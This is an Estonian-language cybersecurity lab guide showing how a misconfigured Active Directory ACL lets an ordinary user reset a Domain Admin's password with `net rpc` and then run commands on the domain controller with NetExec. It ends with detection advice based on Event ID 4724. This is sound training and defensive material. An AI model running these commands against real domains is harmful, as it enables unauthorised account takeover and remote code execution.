Active Directory keskkondades on üks levinumaid ja ohtlikumaid privileegide eskaleerimise (privilege escalation) ründevektoreid pääsuloendite ehk ACL (Access Control List) väärkonfiguratsioon.

Järgnev Proxmoxi virtualiseeritud laborijuhend demonstreerib, kuidas tavakasutajale liigsete delegeeritud õiguste andmine – näiteks Helpdesk töötajale või praktikandile – võimaldab ründajal Kali Linuxist üle võtta täieõigusliku domeeni administraatori konto ilma ühtegi tarkvaralist turvaauku (CVE) kasutamata.

1. **Proxmoxi laborivõrgu ettevalmistus:** Windows Serveri ja Kali isoleerimine.
Veendu, et nii Windows Server (Domeenikontroller, nt IP `192.168.50.10`) kui ka Kali Linux (nt IP `192.168.50.20`) on ühendatud Proxmoxis isoleeritud silda (näiteks `vmbr1`, millel puuduvad füüsilised pordid). See tagab turvalise liivakasti, kus ründetegevus ei häiri asutuse tegelikku võrku.


2. **AD kasutajate loomine:** Domeeni administraator ja tavakasutaja.
Loo Windows Serveris Active Directorys kaks kasutajat:

1. **it_admin:** Lisa see kasutaja *Domain Admins* gruppi. See on meie kõrge väärtusega sihtmärk (parool nt `SuperSalajane1!`).
2. **opilane1:** Jäta see kasutaja tavalisse *Domain Users* gruppi. See on kasutaja, kelle andmed ründaja on kätte saanud (parool nt `Koolitus2026!`).


3. **Haavatavuse (ACL väärkonfiguratsiooni) tekitamine:** Simuleerime levinud IT-osakonna viga.
Teeme teadliku konfigureerimisvea, simuleerides olukorda, kus tavakasutajale anti kogemata õigus muuta administraatori parooli:

1. Ava domeenikontrolleris *Active Directory Users and Computers* (ADUC).
2. Lülita sisse detailne vaade: menüüst *View* -> *Advanced Features*.
3. Otsi üles kasutaja **it_admin**, tee paremklõps ja vali *Properties*.
4. Mine vahekaardile **Security**, klõpsa *Add* ja lisa **opilane1**.
5. Vali nimekirjast `opilane1`, keri allolevat õiguste nimekirja ning märgi linnuke **Allow** lahtrisse rea **Reset password** (või *ForceChangePassword*) kõrval. Klõpsa OK.


4. **Rünnaku läbiviimine Kali Linuxist:** Parooli vahetamine eemalt Samba tööriistadega.
Ründaja (või küberkaitse õpilane) on saanud enda valdusesse `opilane1` parooli ja logib sisse Kali Linuxisse. Kasutades Kalisse sisseehitatud `net rpc` tööriista, kasutab ta oma "Reset password" õigust ära, et muuta domeeni administraatori parool üle võrgu, teadmata administraatori algset parooli.

Ava Kali terminal ja sisesta:

```bash
net rpc password "it_admin" "HackedAdmin2026!" -U "lab.local\opilane1"%"Koolitus2026!" -S 192.168.50.10

```

*Edukuse korral ei anna käsk veateadet ja administraatori parool on nüüd muudetud.*


5. **Koodi käivitamine ja ründe verifitseerimine:** Süsteemi täielik ülevõtmine.
Nüüd, kus ründajal on teada `it_admin` uus parool, saab ta Netexec (endine CrackMapExec) või Impacket tööriistadega domeenikontrolleris käivitada suvalist koodi.

Kontrollime administraatori õiguseid:

```bash
netexec smb 192.168.50.10 -u it_admin -p 'HackedAdmin2026!' -x 'whoami /priv'

```

*Väljund näitab `Pwn3d!` ja kuvab kõrgeimad SYSTEM privileegid. AD server on edukalt üle võetud tavakasutaja konto kaudu.*


6. **Kaitse ja auditeerimine Windows Event logidest:** E-ITS logihalduse praktika.
Pärast rünnakut lase õpilastel analüüsida Windowsi turvalogi (*Security.evtx*). See tegevus genereerib väga spetsiifilise jälje:

* **Event ID 4724:** *An attempt was made to reset an account's password.*
Logist on selgelt näha, et *Subject* (teostaja) oli `opilane1` ja *Target* (ohver) oli `it_admin`. Praktilise turvameetmena tuleks SIEM süsteemi luua häirereegel, mis teavitab koheselt, kui standardkasutaja muudab priviligeeritud grupi liikme parooli.
